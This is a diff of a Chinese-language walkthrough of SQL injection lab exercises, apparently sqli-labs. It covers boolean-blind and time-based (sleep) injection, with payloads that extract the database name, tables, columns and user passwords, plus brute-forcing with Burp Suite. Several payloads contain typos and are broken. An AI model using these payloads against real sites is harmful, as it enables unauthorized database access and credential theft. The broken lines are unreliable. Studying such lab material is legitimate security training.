@@ -250,7 +250,7 @@ __很显然他是会返回错误信息的__
 
 * 查看闭合方式
 ```
-?id=1'
+?id=1' and 1=1 --+
 ```
 ![image](https://user-images.githubusercontent.com/76896357/114853505-6ff92480-9e16-11eb-9d8a-5a3ad5e2362f.png)
 
@@ -266,9 +266,9 @@ __很显然他是会返回错误信息的__
 因此，就用猜测的方法
 
 ```
-?id=1' substr(database(),1,1)='s' --+
+?id=1' and substr(database(),1,1)='s' --+
 ```
-![image](https://user-images.githubusercontent.com/76896357/114854448-6ae8a500-9e17-11eb-8853-d312ff1d1238.png)
+![image](https://user-images.githubusercontent.com/76896357/114865853-704cec00-9e25-11eb-91d1-a1c15fed4458.png)
 
 这里可以借助bp，进行爆破
 
@@ -276,19 +276,112 @@ __很显然他是会返回错误信息的__
 类似于：
 
 这样：
+
 ![image](https://user-images.githubusercontent.com/76896357/114857032-64a7f800-9e1a-11eb-9c08-2ab04a3e08f3.png)
 
 先猜出database()的长度
 
-再利用ascii码一个一个去猜，一般是利用bp爆破
+再利用ascii码一个一个去猜，一般是利用bp爆破，也可以直接爆破
+
+* 查库
 
 
+![image](https://user-images.githubusercontent.com/76896357/114870309-96c15600-9e2a-11eb-989a-15aa884f454b.png)
+
+设置爆破词典
+
+![image](https://user-images.githubusercontent.com/76896357/114870597-ef90ee80-9e2a-11eb-9146-ba6e353e1be1.png)
+
+![image](https://user-images.githubusercontent.com/76896357/114870628-fae41a00-9e2a-11eb-89fd-3420e5e4f9bf.png)
+
+直接可以爆破出来
+
+![image](https://user-images.githubusercontent.com/76896357/114875833-46e58d80-9e30-11eb-9175-7dff2c4758b2.png)
+
+由此可知，库名是security
+
+* 查表：
+```
+?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' --+
+```
+![image](https://user-images.githubusercontent.com/76896357/114887359-f6bff880-9e3a-11eb-839c-1356d722d19c.png)
+
+介绍一种方法:
+利用bp，进行一字母一个字母爆破
+
+![image](https://user-images.githubusercontent.com/76896357/114896206-b795a580-9e42-11eb-8bb7-c932b9fcb159.png)
+
+* 查字段
+```
+?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 1,1),1)='p' --+
+```
+自己手动改变第一个1和第3个1，让bp去爆破字母
+
+![image](https://user-images.githubusercontent.com/76896357/114899272-6804a900-9e45-11eb-81ce-139b06a793a3.png)
+
+剩下的同理。。。过！！！
 
 
+## 9.延时注入
+* 查看其闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/114900519-8323e880-9e46-11eb-882a-660c125bea0c.png)
 
 
+* 发现无论输入什么，就只有那一句话，这就说明，没有回显，没有报错，不能布尔盲注
+
+那么就只能，利用一下，绝招(绝境用的招数)，延时注入
+```
+?id=1' and sleep(5) --+
+```
+![image](https://user-images.githubusercontent.com/76896357/114900360-612a6600-9e46-11eb-90e3-bd246dea60c8.png)
+
+还真睡了5秒
+
+就这样，通过判断真假来让其睡眠
+
+* 查库
+
+判断库的长度
+```
+?id=1 and if(length(database())>5,sleep(3),1) --+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114902251-37723e80-9e48-11eb-928a-e3eb069b74a2.png)
 
 
+之后在尝试找到8，利用bp也可以爆破
+
+之后再构造left语句，查询每一位
+```
+?id=1' and if(left(database(),8)-'ssss',sleep(3),1)
+```
+只要时间够，利用bp是完全可以爆下来的
+* 查表
+
+```
+?id=1' and if(left((select table_name from information_schema.tables where table_schame='sequrity' limit 1,1),1)='s', sleep(3), 1) --+
+```
+
+* 查列
+
+```
+?id=1' and if(left((select column_name from information_schema.columns where table_naem='users' limit 1,1),1)='a',sleep(3),1) --+
+
+?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password', sleep(3), 1) --+//最终结果
+```
+
+* 查字段
+
+```
+?id=1' and if(left((select password from security.users limit 1,1),1)='p',sleep(3),1) --+
+
+?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' , sleep(3), 1) --+//最后结果
+```
+
+由于每次都要手动换好几个数，可以利用sqlmap。。
+
+## 10，和9题类似，只有 单双引号的区别，不再赘述。。。
 
 
 
